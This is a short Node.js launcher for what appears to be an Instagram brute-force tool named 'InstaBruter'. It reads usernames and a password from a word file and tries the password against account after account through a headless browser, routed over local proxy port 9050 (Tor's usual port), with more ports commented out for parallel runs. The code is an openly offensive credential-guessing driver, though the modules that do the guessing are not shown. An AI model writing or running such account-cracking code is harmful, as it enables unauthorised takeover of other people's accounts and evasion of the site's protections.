const puppeteer = require('puppeteer');
const InstaBruter = require('./bruter/bruter')
const start = require('./bruter/konsol')
const fileOps = require('./bruter/wdReader')
const fs = require('fs')






function main() {

  start()
  setTimeout(async () => {
    const value = await fileOps.readFromFile()
    if (value) {
      const res = fileOps.nextUserName()
      test(9050, res)
      //test(9060, res)
      //test(9070, res)
     // test(9080, res)
    }
    //test(#portnumber)
  }, 1000)

  async function test(port, uname) {

    const instance = new InstaBruter(uname, port)
    await instance.createBruter()
    const result = await instance.checkPass(fileOps.currentPass)
    if (result)
      test(port, fileOps.nextUserName())

  }
}

main()







